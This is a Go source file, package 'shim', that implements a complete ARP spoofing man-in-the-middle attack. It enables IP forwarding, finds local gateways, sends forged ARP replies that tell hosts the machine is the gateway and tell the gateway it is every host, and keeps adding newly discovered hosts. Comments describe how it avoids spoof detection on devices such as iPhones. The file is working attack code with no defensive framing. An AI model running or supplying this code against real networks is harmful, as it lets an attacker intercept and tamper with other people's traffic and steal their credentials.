package shim

import (
    "bufio"
    "errors"
    "io"
    "log"
    "net"
    "os"
    "strconv"
    "strings"
    "time"
    "unsafe"
    "github.com/mdlayher/arp"
)

type Gateway struct {
    ip net.IP
    iface *net.Interface
}

func setIpForwarding(enabled bool) error {
    f, err := os.Create("/proc/sys/net/ipv4/ip_forward")
    if err != nil {
        return err
    }
    defer f.Close()

    var val byte = '0'
    if enabled {
        val = '1'
    }

    _, err = f.Write([]byte{val})
    if err != nil {
        return err
    }

    log.Printf("Set IP forwarding enabled -> %t\n", enabled)
    return nil
}

// Reads the gateway routes on the local machine from procfs.
func getGateways() ([]Gateway, error) {
    f, err := os.Open("/proc/net/route")
    if err != nil {
        return nil, err
    }
    defer f.Close()

    r := bufio.NewReader(f)

    // Skip first line (header)
    r.ReadString('\n')

    var gateways []Gateway
    for {
        line, err := r.ReadString('\n')
        if err == io.EOF {
            return gateways, nil
        } else if err != nil {
            return nil, err
        }

        cols := strings.Fields(line)

        // Read IP in native endianness format
        ipInt64, err := strconv.ParseUint(cols[2], 16, 32)
        if err != nil {
            return nil, err
        }

        // Go is an ass, and we won't be working with it again
        ipInt32 := uint32(ipInt64)
        ipBytes := *(*[4]byte)(unsafe.Pointer(&ipInt32))

        // Skip lines where gateway is zero (no gateway)
        ip := net.IP(ipBytes[:])
        if ip.Equal(net.IPv4zero) {
            continue
        }

        // Also get the corresponding interface so we know
        // where to send our ARP packets
        iface, err := net.InterfaceByName(cols[0])
        if err != nil {
            return nil, err
        }

        gateways = append(gateways, Gateway{
            ip: ip,
            iface: iface,
        })
    }
}

// Resolves the MAC address of the specified gateway.
func requestGatewayMAC(client *arp.Client, gateway Gateway) (net.HardwareAddr, error) {
    // Maximum number of tries before giving up,
    // timeout per try
    const tries int = 5
    const timeout time.Duration = 1 * time.Second

    // Reset deadline when we exit
    defer client.SetDeadline(time.Time{})

    for i := 0; i < tries; i++ {
        // Send ARP request packet for the gateway IP
        err := client.Request(gateway.ip)
        if err != nil {
            log.Printf("Failed to send ARP request: %s\n", err)
            return nil, err
        }

        client.SetDeadline(time.Now().Add(timeout))
        for {
            pkt, _, err := client.Read()

            // If read failed, check if it was due to a timeout,
            // and just retry if so
            if err != nil {
                if neterr, ok := err.(net.Error); ok {
                    if neterr.Timeout() {
                        break
                    }
                }
                log.Printf("Failed to recv ARP reply: %s\n", err)
                return nil, err
            }

            // Check that the reply came from the gateway
            if pkt.SenderIP.Equal(gateway.ip) {
                mac := pkt.SenderHardwareAddr
                log.Printf(
                    "Got gateway address on %s: IP(%s) -> MAC(%s)\n",
                    gateway.iface.Name,
                    gateway.ip,
                    mac,
                )
                return mac, nil
            }
        }
    }

    return nil, errors.New("Timed out waiting for ARP reply")
}

var broadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

// Performs an ARP spoof attack on the specified gateway.
func arpSpoof(gateway Gateway) error {
    localMAC := gateway.iface.HardwareAddr

    // Create ARP socket
    client, err := arp.Dial(gateway.iface)
    if err != nil {
        log.Printf("Failed to create ARP socket: %s\n", err)
        return err
    }

    // Get MAC of gateway so we know who to impersonate
    gatewayMAC, err := requestGatewayMAC(client, gateway)
    if err != nil {
        log.Printf("Failed to get gateway address: %s\n", err)
        return err
    }

    // Start off with just the gateway address known
    hosts := make(map[string]bool)
    hosts[string(gateway.ip)] = true

    for {
        // Send fake gratuitous ARP packet to known hosts
        for hostStr := range hosts {
            host := net.IP(hostStr)

            // Tell everyone in the LAN that we are the gateway.
            // But only tell the gateway that we are everyone in the LAN.
            // Some devices (e.g. iPhone) detect that someone is spoofing
            // their MAC address and treat it as an IP address conflict
            // and disconnect from the network.
            destMAC := broadcastMAC
            if !host.Equal(gateway.ip) {
                destMAC = gatewayMAC
            }

            pkt, err := arp.NewPacket(
                arp.OperationReply,
                localMAC,
                host,
                destMAC,
                host,
            )
            if err != nil {
                log.Printf("Failed to create ARP packet: %s\n", err)
                return err
            }
            client.WriteTo(pkt, destMAC)
        }

        // Scan for incoming ARP requests for one second
        client.SetReadDeadline(time.Now().Add(1 * time.Second))
        for {
            pkt, _, err := client.Read()
            if err != nil {
                if neterr, ok := err.(net.Error); ok {
                    if neterr.Timeout() {
                        break
                    }
                }
                log.Printf("Failed to recv ARP packet: %s\n", err)
                return err
            }

            // Add sender IP address to our known hosts list.
            // Avoid target IP address since it might not exist.
            if !hosts[string(pkt.SenderIP)] {
                log.Printf("Discovered new host: %s\n", pkt.SenderIP)
                hosts[string(pkt.SenderIP)] = true
            }
        }
    }
}

// Runs an ARP spoof attack on all local gateways.
// This blocks until the attack stops (which only
// occurs on an error).
func ArpSpoof() error {
    err := setIpForwarding(true)
    if err != nil {
        log.Printf("Failed to enable IP forwarding: %s\n", err)
        return err
    }
    defer setIpForwarding(false)

    gateways, err := getGateways()
    if err != nil {
        log.Printf("Failed to find gateways: %s\n", err)
        return err
    }

    // Run attacks in parallel
    out := make(chan error)
    for _, gateway := range gateways {
        go func(gateway Gateway) {
            err := arpSpoof(gateway)
            if err != nil {
                log.Printf(
                    "ARP spoofing on %s failed: %s\n",
                    gateway.iface.Name,
                    err,
                )
            }
            out <- err
        }(gateway)
    }

    // Wait for threads to finish. First error that occurs
    // becomes our return value.
    for i := 0; i < len(gateways); i++ {
        tmp := <-out
        if tmp != nil {
            err = tmp
        }
    }

    return err
}
